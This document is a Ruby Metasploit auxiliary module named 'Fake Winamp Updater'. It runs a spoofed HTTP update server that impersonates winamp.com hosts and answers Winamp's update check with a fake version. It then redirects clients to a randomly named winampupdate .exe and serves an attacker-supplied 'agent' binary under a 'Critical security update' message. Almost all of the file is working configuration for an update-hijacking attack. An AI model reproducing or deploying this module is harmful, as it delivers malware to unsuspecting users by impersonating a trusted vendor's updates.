require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Winamp Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Winamp updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)

		@base = {
			'vh' => ['www.winamp.com', 'client.winamp.com'],
			'request' => [{
				'req' => '/update/latest-version.php', 
				'type' => 'string', 
				'method' => '', 
				'bin'    => 0,
				'string' => "<%VERSION%>\r\n<%URL%>\r\n",
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '/getfile', 
				'type' => 'string', 
				'method' => '', 
				'bin'    => 0,
				'string' => '<html><script>window.location="http://www.winamp.com/winampupdate<%RND1%>.exe"</script><%DESCRIPTION%></html>',
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '/update/client_session.php', 
				'type' => 'string', 
				'method' => '', 
				'bin'    => 0,
				'string' => '',
				'parse' => 0,
				'file' => '',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'method' => '', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {  
				'description'  => { 
					'val' => 'Critical security update, processing update..',
					'desc' => 'Description display in the update'
				},
				'version'  => { 
					'val' => '"9.#{RndNum(3)}"',
					#'val' => '\'30.\'.RndNum(1).\'.\'.RndNum(4).\'.\'.RndNum(1)',
					'hidden' => 1,
					'dynamic' =>1,
				},
				'url'  => { 
					'val' => '"http://www.winamp.com/getfile#{RndAlpha(10)}.html"',
					'hidden' => 1,
					'dynamic' =>1,
				},			    	  				
				'rnd1'  => {
					'val' => 'RndNum(5)',
					'hidden' => 1,
					'dynamic' =>1
				}			    	  
			}
		}
	end
end
